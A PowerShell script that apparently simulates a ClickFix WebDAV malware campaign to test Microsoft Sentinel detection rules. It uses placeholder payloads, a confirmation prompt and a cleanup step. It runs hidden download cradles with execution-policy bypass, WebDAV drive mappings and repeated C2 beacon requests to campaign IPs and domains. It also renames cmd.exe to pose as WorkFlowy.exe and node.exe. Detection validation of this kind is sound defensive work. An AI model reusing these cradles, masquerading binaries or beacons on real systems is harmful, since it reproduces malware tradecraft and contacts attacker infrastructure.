#Requires -RunAsAdministrator
<#
.SYNOPSIS
    ClickFix WebDAV Campaign - Full Attack Chain Simulation Script
    For Microsoft Sentinel Detection Validation

.DESCRIPTION
    Simulates all stages of the ClickFix WebDAV campaign (Jan-Mar 2026) to trigger
    the following Sentinel detection rules:

    RULE 1  - ClickFix WebDAV - IoC Detection (Domains, IPs, Hashes)
    RULE 2  - ClickFix WebDAV - Suspicious RunMRU Command Execution
    RULE 3  - ClickFix WebDAV - WebDAV Drive Mapping Detection
    RULE 4  - ClickFix WebDAV - PowerShell ZIP Download Cradle
    RULE 5  - ClickFix WebDAV - Trojanized Electron Child Process Execution
    RULE 6  - ClickFix WebDAV - Victim ID File Creation (id.txt)
    RULE 7  - ClickFix WebDAV - High-Frequency C2 Beaconing
    RULE 8  - ClickFix WebDAV - Payload Drop in TEMP Timestamp Directory
    RULE 9  - ClickFix WebDAV - ZIP Extraction to LOCALAPPDATA
    RULE 10 - ClickFix WebDAV - Suspicious Electron App Execution Path
    RULE 11 - ClickFix WebDAV - Full Attack Chain Correlation

.NOTES
    ENVIRONMENT  : Windows VM onboarded to Microsoft Sentinel (MDE/Defender for Endpoint)
    AUTHOR       : Detection Validation Script
    CAMPAIGN REF : Atos Threat Research Center - March 13, 2026
    WARNING      : Run ONLY in an isolated lab/VM. This script creates files,
                   writes registry keys, and makes outbound network connections.
                   Clean-up is performed automatically at the end.
#>

# ============================================================
# CONFIGURATION
# ============================================================
$SimulatedC2IP        = "94.156.170.255"
$SimulatedC2Domain    = "cloudflare.report"
$SimulatedC2Domain2   = "happyglamper.ro"
$SimulatedWebDAVURL   = "https://happyglamper.ro/share/files"
$SimulatedZipURL      = "https://cloudflare.report/flowy.zip"
$AppName              = "MyApp"
$AppExeName           = "WorkFlowy.exe"
$LocalAppDataPath     = [System.Environment]::GetFolderPath("LocalApplicationData")
$AppDataRoaming       = [System.Environment]::GetFolderPath("ApplicationData")
$TempPath             = [System.IO.Path]::GetTempPath()
$AppInstallDir        = Join-Path $LocalAppDataPath $AppName
$VictimIdFile         = Join-Path $AppDataRoaming "id.txt"
$FakeElectronExe      = Join-Path $AppInstallDir $AppExeName
$FakeNodeExe          = Join-Path $AppInstallDir "node.exe"
$FakeZipPath          = Join-Path $TempPath "flowy.zip"
$RunMRUKey            = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"

# ============================================================
# HELPER FUNCTIONS
# ============================================================

function Write-Banner {
    param([string]$Text, [string]$Color = "Cyan")
    Write-Host ""
    Write-Host ("=" * 70) -ForegroundColor $Color
    Write-Host "  $Text" -ForegroundColor $Color
    Write-Host ("=" * 70) -ForegroundColor $Color
}

function Write-Step {
    param([string]$RuleRef, [string]$StepName, [string]$Detail = "")
    Write-Host ""
    Write-Host "[*] " -NoNewline -ForegroundColor Yellow
    Write-Host "$RuleRef" -NoNewline -ForegroundColor Magenta
    Write-Host " >> $StepName" -ForegroundColor White
    if ($Detail) {
        Write-Host "    $Detail" -ForegroundColor DarkGray
    }
}

function Write-Success {
    param([string]$Msg)
    Write-Host "    [+] $Msg" -ForegroundColor Green
}

function Write-Info {
    param([string]$Msg)
    Write-Host "    [i] $Msg" -ForegroundColor DarkCyan
}

function Write-Warn {
    param([string]$Msg)
    Write-Host "    [!] $Msg" -ForegroundColor DarkYellow
}

function Ensure-Directory {
    param([string]$Path)
    if (-not (Test-Path $Path)) {
        New-Item -ItemType Directory -Path $Path -Force | Out-Null
    }
}

# ============================================================
# PRE-FLIGHT
# ============================================================

Write-Banner "ClickFix WebDAV - Attack Chain Simulation" "Cyan"
Write-Host ""
Write-Host "  Target Rules   : 11 Sentinel Detection Rules" -ForegroundColor White
Write-Host "  Campaign       : ClickFix WebDAV (Jan-Mar 2026)" -ForegroundColor White
Write-Host "  Reference      : Atos Threat Research Center, March 13 2026" -ForegroundColor White
Write-Host "  Simulated C2   : $SimulatedC2IP / $SimulatedC2Domain" -ForegroundColor White
Write-Host "  App Install Dir: $AppInstallDir" -ForegroundColor White
Write-Host ""
Write-Warn "Ensure this VM is onboarded to MDE and logs are flowing to Sentinel."
Write-Warn "Allow 5-15 minutes after script completion for events to appear in Sentinel."
Write-Host ""

$continue = Read-Host "  Continue with simulation? [Y/N]"
if ($continue -ne "Y" -and $continue -ne "y") {
    Write-Host "  Aborted." -ForegroundColor Red
    exit
}

# Ensure the fake app directory exists
Ensure-Directory -Path $AppInstallDir

# ============================================================
# STAGE 1 - RunMRU Registry Simulation
# Targets: RULE 2, RULE 11
# ============================================================

Write-Banner "STAGE 1 - RunMRU Command Execution (Rules 2, 11)" "Yellow"

Write-Step "RULE 2" "Writing suspicious commands to RunMRU registry key" `
    "Simulates user executing commands via Win+R Run dialog"

$RunMRUCommands = @{
    "a" = "cmd /c net use * https://happyglamper.ro/share/files /persistent:no\1"
    "b" = "powershell.exe -ep bypass -c Invoke-WebRequest https://cloudflare.report/flowy.zip\1"
    "c" = "net use Z: https://cloudflare.report/share /persistent:no\1"
}

foreach ($entry in $RunMRUCommands.GetEnumerator()) {
    try {
        Set-ItemProperty -Path $RunMRUKey -Name $entry.Key -Value $entry.Value -Force
        Write-Success "Set RunMRU[$($entry.Key)] = $($entry.Value.Substring(0, [Math]::Min(60, $entry.Value.Length)))..."
    }
    catch {
        Write-Warn "Could not set RunMRU entry: $_"
    }
}

# Also update the MRUList value
try {
    Set-ItemProperty -Path $RunMRUKey -Name "MRUList" -Value "cba" -Force
    Write-Success "Updated MRUList order"
}
catch {
    Write-Warn "Could not update MRUList: $_"
}

# Approach 2: Trigger registry write via cmd.exe (generates InitiatingProcessFileName = explorer.exe
# is not possible directly, but writing via PowerShell still writes to the key which MDE detects)
Write-Info "Registry entries written. MDE DeviceRegistryEvents will capture these."

Start-Sleep -Seconds 2

# ============================================================
# STAGE 2 - WebDAV Drive Mapping
# Targets: RULE 3, RULE 11
# ============================================================

Write-Banner "STAGE 2 - WebDAV Drive Mapping via net use (Rules 3, 11)" "Yellow"

Write-Step "RULE 3" "Executing net use with HTTP/HTTPS WebDAV URL" `
    "Command: net use * https://happyglamper.ro/share/files /persistent:no"

# Approach 1: Direct net use (will fail to connect but MDE logs the process event)
try {
    $proc = Start-Process -FilePath "net.exe" `
        -ArgumentList "use", "*", "https://happyglamper.ro/share/files", "/persistent:no" `
        -Wait -PassThru -WindowStyle Hidden
    Write-Success "net.exe launched (exit code: $($proc.ExitCode)) - process event logged by MDE"
}
catch {
    Write-Warn "net.exe execution issue: $_"
}

Start-Sleep -Seconds 1

# Approach 2: Via cmd.exe to vary initiating process
Write-Step "RULE 3" "Second approach via cmd.exe parent" `
    "Command: cmd /c net use Z: https://cloudflare.report/webdav /persistent:no"

try {
    $proc2 = Start-Process -FilePath "cmd.exe" `
        -ArgumentList "/c", "net use Z: https://cloudflare.report/webdav /persistent:no" `
        -Wait -PassThru -WindowStyle Hidden
    Write-Success "cmd.exe > net.exe launched (exit code: $($proc2.ExitCode)) - logged by MDE"
}
catch {
    Write-Warn "cmd.exe net use issue: $_"
}

# Approach 3: net1.exe variant (also monitored by the rule)
Write-Step "RULE 3" "Third approach using net1.exe" `
    "net1.exe use * https://94.156.170.255/share /persistent:no"

try {
    $net1Path = Join-Path $env:SystemRoot "System32\net1.exe"
    if (Test-Path $net1Path) {
        $proc3 = Start-Process -FilePath $net1Path `
            -ArgumentList "use", "*", "https://94.156.170.255/share", "/persistent:no" `
            -Wait -PassThru -WindowStyle Hidden
        Write-Success "net1.exe launched (exit code: $($proc3.ExitCode)) - logged by MDE"
    }
    else {
        Write-Warn "net1.exe not found at $net1Path"
    }
}
catch {
    Write-Warn "net1.exe issue: $_"
}

Start-Sleep -Seconds 2

# ============================================================
# STAGE 3 - PowerShell ZIP Download Cradle
# Targets: RULE 4, RULE 11
# ============================================================

Write-Banner "STAGE 3 - PowerShell ZIP Download Cradle (Rules 4, 11)" "Yellow"

Write-Step "RULE 4" "Invoke-WebRequest to download flowy.zip" `
    "Simulates PS download cradle for trojanized Electron app"

# Approach 1: Invoke-WebRequest cradle (connection will fail but command line is logged)
$PS_DownloadCmd1 = @"
try {
    Invoke-WebRequest -Uri 'https://cloudflare.report/flowy.zip' -OutFile '$FakeZipPath' -ErrorAction SilentlyContinue
} catch {}
Write-Host 'Download stage simulated'
"@

try {
    $proc = Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", $PS_DownloadCmd1 `
        -Wait -PassThru -WindowStyle Hidden
    Write-Success "PowerShell Invoke-WebRequest cradle executed - command line logged by MDE"
}
catch {
    Write-Warn "PS download cradle issue: $_"
}

Start-Sleep -Seconds 1

# Approach 2: DownloadFile method variant
Write-Step "RULE 4" "WebClient.DownloadFile variant" `
    "[Net.WebClient]::new().DownloadFile for flowy.zip to TEMP"

$PS_DownloadCmd2 = @"
try {
    `$wc = [System.Net.WebClient]::new()
    `$wc.DownloadFile('https://happyglamper.ro/dl.zip', '$($env:TEMP)\dl.zip')
} catch {}
"@

try {
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-ep", "bypass", "-WindowStyle", "Hidden", "-c", $PS_DownloadCmd2 `
        -Wait -WindowStyle Hidden
    Write-Success "WebClient DownloadFile cradle simulated - logged by MDE"
}
catch {
    Write-Warn "WebClient cradle issue: $_"
}

Start-Sleep -Seconds 1

# Approach 3: curl alias (also caught by the rule's has_any list)
Write-Step "RULE 4" "curl/wget alias variant targeting .zip file" `
    "powershell -c curl https://cloudflare.report/flowy.zip -OutFile flowy.zip"

$PS_DownloadCmd3 = "try { curl 'https://cloudflare.report/flowy.zip' -OutFile `"$env:TEMP\flowy.zip`" -ErrorAction SilentlyContinue } catch {}"

try {
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-ep", "bypass", "-WindowStyle", "Hidden", "-Command", $PS_DownloadCmd3 `
        -Wait -WindowStyle Hidden
    Write-Success "curl alias download cradle simulated - logged by MDE"
}
catch {
    Write-Warn "curl cradle issue: $_"
}

Start-Sleep -Seconds 2

# ============================================================
# STAGE 4 - ZIP Extraction to LOCALAPPDATA
# Targets: RULE 9, RULE 11
# ============================================================

Write-Banner "STAGE 4 - ZIP Extraction to LOCALAPPDATA (Rules 9, 11)" "Yellow"

Write-Step "RULE 9" "Expand-Archive to `$env:LOCALAPPDATA\MyApp" `
    "Simulates extraction of trojanized Electron app from flowy.zip"

# Create a dummy zip to extract (harmless content)
$DummyZipContent = Join-Path $TempPath "sim_dummy.txt"
"ClickFix WebDAV Simulation - Harmless Placeholder" | Out-File -FilePath $DummyZipContent -Encoding UTF8

$DummyZip = Join-Path $TempPath "flowy.zip"
try {
    Compress-Archive -Path $DummyZipContent -DestinationPath $DummyZip -Force
    Write-Success "Created dummy flowy.zip at $DummyZip"
}
catch {
    Write-Warn "Could not create dummy zip: $_"
}

# Approach 1: Expand-Archive with $env:LOCALAPPDATA
$PS_ExtractCmd1 = "Expand-Archive -Path `"$DummyZip`" -DestinationPath `"`$env:LOCALAPPDATA\$AppName`" -Force"

try {
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-ep", "bypass", "-WindowStyle", "Hidden", "-Command", $PS_ExtractCmd1 `
        -Wait -WindowStyle Hidden
    Write-Success "Expand-Archive to LOCALAPPDATA\MyApp executed - logged by MDE"
}
catch {
    Write-Warn "Expand-Archive issue: $_"
}

Start-Sleep -Seconds 1

# Approach 2: Using %LOCALAPPDATA% env variable form
$PS_ExtractCmd2 = "Expand-Archive -Path `"$DummyZip`" -DestinationPath `"%LOCALAPPDATA%\$AppName`" -Force"

try {
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-ep", "bypass", "-WindowStyle", "Hidden", "-Command", $PS_ExtractCmd2 `
        -Wait -WindowStyle Hidden
    Write-Success "Expand-Archive with %%LOCALAPPDATA%% syntax simulated"
}
catch {
    Write-Warn "Expand-Archive variant 2 issue: $_"
}

Start-Sleep -Seconds 2

# ============================================================
# STAGE 5 - Suspicious Electron App (WorkFlowy.exe) Execution
# Targets: RULE 10, RULE 5, RULE 11
# ============================================================

Write-Banner "STAGE 5 - Trojanized Electron App Execution (Rules 5, 10, 11)" "Yellow"

Write-Step "RULE 10" "Creating WorkFlowy.exe in AppData\Local\MyApp" `
    "Benign placeholder exe to represent trojanized Electron app"

# Copy cmd.exe as WorkFlowy.exe (a harmless placeholder that MDE will log)
Ensure-Directory -Path $AppInstallDir

try {
    Copy-Item -Path "$env:SystemRoot\System32\cmd.exe" -Destination $FakeElectronExe -Force
    Write-Success "Created fake WorkFlowy.exe at $FakeElectronExe"
}
catch {
    Write-Warn "Could not create fake WorkFlowy.exe: $_"
}

# Also create a fake node.exe in the same directory
try {
    Copy-Item -Path "$env:SystemRoot\System32\cmd.exe" -Destination $FakeNodeExe -Force
    Write-Success "Created fake node.exe at $FakeNodeExe"
}
catch {
    Write-Warn "Could not create fake node.exe: $_"
}

# Execute WorkFlowy.exe from AppData\Local\MyApp (triggers Rule 10)
Write-Step "RULE 10" "Executing WorkFlowy.exe from \AppData\Local\MyApp\" `
    "MDE DeviceProcessEvents will log FolderPath has \MyApp\"

try {
    $proc = Start-Process -FilePath $FakeElectronExe `
        -ArgumentList "/c", "echo ClickFix WorkFlowy simulation" `
        -Wait -PassThru -WindowStyle Hidden
    Write-Success "WorkFlowy.exe executed from $AppInstallDir (exit: $($proc.ExitCode))"
}
catch {
    Write-Warn "WorkFlowy.exe execution issue: $_"
}

Start-Sleep -Seconds 1

# Trigger Rule 5: WorkFlowy.exe spawning cmd.exe child process
Write-Step "RULE 5" "WorkFlowy.exe spawning cmd.exe child process" `
    "Simulates malicious Node.js child_process.exec() call from Electron"

# We use the fake WorkFlowy.exe (which is cmd.exe) to spawn another cmd.exe
# MDE captures: InitiatingProcessFileName = WorkFlowy.exe, FileName = cmd.exe
try {
    $proc = Start-Process -FilePath $FakeElectronExe `
        -ArgumentList "/c", "cmd.exe /c whoami" `
        -Wait -PassThru -WindowStyle Hidden
    Write-Success "WorkFlowy.exe > cmd.exe child process simulated"
}
catch {
    Write-Warn "Child process simulation issue: $_"
}

Start-Sleep -Seconds 1

# WorkFlowy.exe spawning PowerShell child
Write-Step "RULE 5" "WorkFlowy.exe spawning powershell.exe child process" `
    "Simulates C2-instructed PowerShell execution from Electron"

try {
    $proc = Start-Process -FilePath $FakeElectronExe `
        -ArgumentList "/c", "powershell.exe -ep bypass -c Write-Host 'child_process exec simulation'" `
        -Wait -PassThru -WindowStyle Hidden
    Write-Success "WorkFlowy.exe > powershell.exe child process simulated"
}
catch {
    Write-Warn "PowerShell child process simulation issue: $_"
}

Start-Sleep -Seconds 2

# ============================================================
# STAGE 6 - Victim ID File Creation (id.txt in AppData\Roaming)
# Targets: RULE 6
# ============================================================

Write-Banner "STAGE 6 - Victim ID File Creation in AppData\Roaming (Rule 6)" "Yellow"

Write-Step "RULE 6" "Creating id.txt in AppData\Roaming" `
    "Simulates campaign victim identifier written by malicious Electron app"

# Generate a random victim ID (mimics what the malware does)
$VictimId = [System.Guid]::NewGuid().ToString("N").Substring(0, 16)

try {
    $VictimIdContent = "victim_id=$VictimId`ncampaign=clickfix_webdav`ntimestamp=$(Get-Date -Format 'yyyyMMddHHmmss')"
    Set-Content -Path $VictimIdFile -Value $VictimIdContent -Encoding UTF8 -Force
    Write-Success "Created $VictimIdFile with victim ID: $VictimId"
}
catch {
    Write-Warn "Could not create id.txt: $_"
}

# Approach 2: Modify the file (ActionType = FileModified also triggers the rule)
Start-Sleep -Seconds 2
try {
    $UpdatedContent = "victim_id=$VictimId`ncampaign=clickfix_webdav`ntimestamp=$(Get-Date -Format 'yyyyMMddHHmmss')`nbeacon_count=1"
    Set-Content -Path $VictimIdFile -Value $UpdatedContent -Encoding UTF8 -Force
    Write-Success "Modified id.txt (FileModified event triggered)"
}
catch {
    Write-Warn "Could not modify id.txt: $_"
}

Start-Sleep -Seconds 2

# ============================================================
# STAGE 7 - Payload Drop in TEMP Timestamp Directory
# Targets: RULE 8
# ============================================================

Write-Banner "STAGE 7 - Payload Drop in TEMP Timestamp Directory (Rule 8)" "Yellow"

Write-Step "RULE 8" "Creating EXE/DLL/PS1 in TEMP\<13-digit-timestamp>\" `
    "Simulates C2-delivered payload dropped to Unix-ms-timestamp subdirectory"

# Generate a 13-digit Unix timestamp in milliseconds
$UnixTimestampMs = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds().ToString()
$TsDir = Join-Path $TempPath $UnixTimestampMs
Ensure-Directory -Path $TsDir

Write-Info "Timestamp directory: $TsDir"

# Drop EXE placeholder
$FakePayloadExe = Join-Path $TsDir "payload.exe"
try {
    Copy-Item -Path "$env:SystemRoot\System32\notepad.exe" -Destination $FakePayloadExe -Force
    Write-Success "Dropped fake payload.exe to $TsDir"
}
catch {
    Write-Warn "Could not create payload.exe: $_"
}

# Drop DLL placeholder
$FakePayloadDll = Join-Path $TsDir "module.dll"
try {
    [byte[]]$DllBytes = [System.Text.Encoding]::UTF8.GetBytes("MZ - Simulated DLL placeholder for ClickFix validation")
    [System.IO.File]::WriteAllBytes($FakePayloadDll, $DllBytes)
    Write-Success "Dropped fake module.dll to $TsDir"
}
catch {
    Write-Warn "Could not create module.dll: $_"
}

# Drop PS1 placeholder
$FakePayloadPs1 = Join-Path $TsDir "stager.ps1"
try {
    "# ClickFix WebDAV Simulation - Stager placeholder`nWrite-Host 'C2 stager simulated'" | 
        Out-File -FilePath $FakePayloadPs1 -Encoding UTF8 -Force
    Write-Success "Dropped fake stager.ps1 to $TsDir"
}
catch {
    Write-Warn "Could not create stager.ps1: $_"
}

# Execute the fake payload from the timestamp directory (generates DeviceProcessEvents with timestamp FolderPath)
Write-Step "RULE 8" "Executing payload from timestamp directory" `
    "Generates DeviceProcessEvents with FolderPath matching \Temp\<13-digit>\"

try {
    $proc = Start-Process -FilePath $FakePayloadExe `
        -Wait -PassThru -WindowStyle Hidden
    Write-Success "Executed payload.exe from $TsDir (exit: $($proc.ExitCode))"
}
catch {
    Write-Warn "Payload execution issue: $_"
}

Start-Sleep -Seconds 2

# ============================================================
# STAGE 8 - High-Frequency C2 Beaconing
# Targets: RULE 7
# ============================================================

Write-Banner "STAGE 8 - High-Frequency C2 Beaconing Simulation (Rule 7)" "Yellow"

Write-Step "RULE 7" "Simulating high-frequency outbound connections from node.exe" `
    "Generates >10 connections in 5-min window to trigger beaconing alert"

Write-Info "Running 15 rapid connections over ~30 seconds via node.exe (fake)"
Write-Info "Rule threshold: ConnectionCount > 10 within 5-minute bin"

# The rule looks for InitiatingProcessFileName in~ (node.exe, WorkFlowy.exe)
# We run our fake node.exe (copy of cmd.exe) to make HTTP connection attempts

$BeaconUrls = @(
    "http://cloudflare.report/forever/e/beacon",
    "http://144.31.165.173/c2/check",
    "http://cloudflare.report/forever/e/data",
    "http://94.156.170.255/gate"
)

$BeaconScript = {
    param($NodeExePath, $BeaconUrls, $Count)
    for ($i = 1; $i -le $Count; $i++) {
        $url = $BeaconUrls[$i % $BeaconUrls.Count]
        try {
            # Use fake node.exe (cmd.exe) to spawn curl for the connection
            # This makes InitiatingProcessFileName appear as our renamed binary
            $proc = Start-Process -FilePath $NodeExePath `
                -ArgumentList "/c", "curl --max-time 1 -s `"$url`" >nul 2>&1" `
                -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
        catch { }
        Start-Sleep -Milliseconds 1800  # ~every 2 seconds like the real campaign
    }
}

try {
    # Run beaconing in rapid succession
    for ($i = 1; $i -le 15; $i++) {
        $url = $BeaconUrls[$i % $BeaconUrls.Count]
        Start-Process -FilePath $FakeNodeExe `
            -ArgumentList "/c", "curl --max-time 1 -s `"$url`" 2>nul" `
            -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
        
        if ($i % 5 -eq 0) {
            Write-Info "Beacon attempt $i/15 sent to $url"
        }
        Start-Sleep -Milliseconds 2000
    }
    Write-Success "15 beacon attempts dispatched from fake node.exe (WorkFlowy.exe also in same dir)"
}
catch {
    Write-Warn "Beaconing simulation issue: $_"
}

# Additionally run WorkFlowy.exe beaconing
Write-Step "RULE 7" "WorkFlowy.exe beaconing variant" `
    "Rule also triggers on WorkFlowy.exe as initiating process"

try {
    for ($i = 1; $i -le 12; $i++) {
        $url = $BeaconUrls[$i % $BeaconUrls.Count]
        Start-Process -FilePath $FakeElectronExe `
            -ArgumentList "/c", "curl --max-time 1 -s `"$url`" 2>nul" `
            -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 2000
    }
    Write-Success "12 beacon attempts dispatched from WorkFlowy.exe"
}
catch {
    Write-Warn "WorkFlowy beaconing issue: $_"
}

Start-Sleep -Seconds 3

# ============================================================
# STAGE 9 - IoC Network Connections
# Targets: RULE 1
# ============================================================

Write-Banner "STAGE 9 - IoC Network Connection Simulation (Rule 1)" "Yellow"

Write-Step "RULE 1" "Initiating connections to known malicious IPs and domains" `
    "Triggers DeviceNetworkEvents matching campaign IoC list"

$IoCTargets = @(
    "http://cloudflare.report/test",
    "http://happyglamper.ro/check",
    "http://94.156.170.255/gate",
    "http://144.31.165.173/beacon"
)

foreach ($target in $IoCTargets) {
    try {
        Start-Process -FilePath "powershell.exe" `
            -ArgumentList "-ep", "bypass", "-WindowStyle", "Hidden", "-c", `
            "try { Invoke-WebRequest -Uri '$target' -TimeoutSec 2 -ErrorAction SilentlyContinue } catch {}" `
            -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
        Write-Success "Connection attempt initiated to: $target"
        Start-Sleep -Milliseconds 800
    }
    catch {
        Write-Warn "IoC connection attempt issue for $target"
    }
}

# curl variant for additional process coverage
Write-Step "RULE 1" "curl-based IoC connection attempts" `
    "Additional network events via curl to campaign C2 domains"

try {
    Start-Process -FilePath "cmd.exe" `
        -ArgumentList "/c", "curl --max-time 2 -s http://cloudflare.report/forever/e/ 2>nul" `
        -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    Write-Success "curl connection to cloudflare.report/forever/e/ attempted"
}
catch {
    Write-Warn "curl IoC attempt issue: $_"
}

Start-Sleep -Seconds 2

# ============================================================
# STAGE 10 - Full Chain Verification (Rule 11)
# ============================================================

Write-Banner "STAGE 10 - Full Attack Chain Correlation (Rule 11)" "Yellow"

Write-Step "RULE 11" "All four chain stages have been simulated" `
    "Rule 11 correlation will fire when RunMRU + WebDAV + PowerShell + Electron all present"

Write-Info "Chain stages completed:"
Write-Info "  Stage 1 : RunMRU - DONE (registry entries written)"
Write-Info "  Stage 2 : WebDAV - DONE (net.exe/net1.exe use https://...)"
Write-Info "  Stage 3 : PowerShell - DONE (Invoke-WebRequest .zip cradle)"
Write-Info "  Stage 4 : Electron - DONE (WorkFlowy.exe from \MyApp\ executed)"
Write-Info "Rule 11 runs on PT12H frequency - expect alert within next query cycle"

# ============================================================
# SUMMARY
# ============================================================

Write-Banner "SIMULATION COMPLETE - Summary" "Green"

Write-Host ""
Write-Host "  Rule                                        | Triggered By" -ForegroundColor White
Write-Host "  ------------------------------------------- | ---------------------------------" -ForegroundColor DarkGray
Write-Host "  RULE 1  - IoC Detection                     | Stages 9 (network to IPs/domains)" -ForegroundColor Green
Write-Host "  RULE 2  - RunMRU Execution                  | Stage 1 (registry writes)" -ForegroundColor Green
Write-Host "  RULE 3  - WebDAV Drive Mapping              | Stage 2 (net.exe use https://)" -ForegroundColor Green
Write-Host "  RULE 4  - PowerShell ZIP Cradle             | Stage 3 (Invoke-WebRequest .zip)" -ForegroundColor Green
Write-Host "  RULE 5  - Electron Child Process            | Stage 5 (WorkFlowy.exe > cmd/ps)" -ForegroundColor Green
Write-Host "  RULE 6  - Victim ID (id.txt)                | Stage 6 (id.txt in AppData\Roaming)" -ForegroundColor Green
Write-Host "  RULE 7  - High-Freq C2 Beaconing            | Stage 8 (15 connections in <5min)" -ForegroundColor Green
Write-Host "  RULE 8  - Payload in TEMP Timestamp Dir     | Stage 7 (exe/dll/ps1 in Temp\<13>)" -ForegroundColor Green
Write-Host "  RULE 9  - ZIP Extraction to LOCALAPPDATA    | Stage 4 (Expand-Archive \MyApp)" -ForegroundColor Green
Write-Host "  RULE 10 - Suspicious Electron Exec Path     | Stage 5 (WorkFlowy.exe from \MyApp)" -ForegroundColor Green
Write-Host "  RULE 11 - Full Chain Correlation            | All stages combined" -ForegroundColor Green
Write-Host ""
Write-Warn "Wait 5-15 min for MDE to forward events to Sentinel, then run detection queries."
Write-Warn "Sentinel query frequencies range from PT6H to PT12H - plan accordingly."
Write-Host ""

# ============================================================
# CLEANUP
# ============================================================

Write-Banner "CLEANUP - Removing Simulation Artifacts" "DarkCyan"

$cleanupConfirm = Read-Host "  Run cleanup now? Removes all simulation files/registry entries [Y/N]"

if ($cleanupConfirm -eq "Y" -or $cleanupConfirm -eq "y") {

    # Remove RunMRU entries
    Write-Step "CLEANUP" "Removing RunMRU registry entries"
    try {
        foreach ($key in @("a", "b", "c")) {
            Remove-ItemProperty -Path $RunMRUKey -Name $key -ErrorAction SilentlyContinue
        }
        Write-Success "RunMRU entries removed"
    }
    catch { Write-Warn "RunMRU cleanup issue: $_" }

    # Remove id.txt
    Write-Step "CLEANUP" "Removing $VictimIdFile"
    try {
        Remove-Item -Path $VictimIdFile -Force -ErrorAction SilentlyContinue
        Write-Success "id.txt removed"
    }
    catch { Write-Warn "id.txt removal issue: $_" }

    # Remove AppInstallDir
    Write-Step "CLEANUP" "Removing $AppInstallDir"
    try {
        Remove-Item -Path $AppInstallDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-Success "MyApp directory removed"
    }
    catch { Write-Warn "AppInstallDir removal issue: $_" }

    # Remove timestamp directory
    Write-Step "CLEANUP" "Removing timestamp temp directory $TsDir"
    try {
        Remove-Item -Path $TsDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-Success "Timestamp TEMP directory removed"
    }
    catch { Write-Warn "Timestamp dir removal issue: $_" }

    # Remove dummy zip
    Write-Step "CLEANUP" "Removing dummy zip files"
    try {
        Remove-Item -Path $FakeZipPath -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$TempPath\dl.zip" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$TempPath\sim_dummy.txt" -Force -ErrorAction SilentlyContinue
        Write-Success "Dummy zip files removed"
    }
    catch { Write-Warn "Zip cleanup issue: $_" }

    Write-Host ""
    Write-Host "  Cleanup complete. All simulation artifacts removed." -ForegroundColor Green
}
else {
    Write-Host ""
    Write-Warn "Cleanup skipped. Run script again and choose Y at cleanup prompt, or remove manually:"
    Write-Info "  Registry: HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU  (keys a, b, c)"
    Write-Info "  File    : $VictimIdFile"
    Write-Info "  Dir     : $AppInstallDir"
    Write-Info "  Dir     : $TsDir"
}

Write-Host ""
Write-Host ("=" * 70) -ForegroundColor Cyan
Write-Host "  ClickFix WebDAV Simulation Complete" -ForegroundColor Cyan
Write-Host ("=" * 70) -ForegroundColor Cyan
Write-Host ""
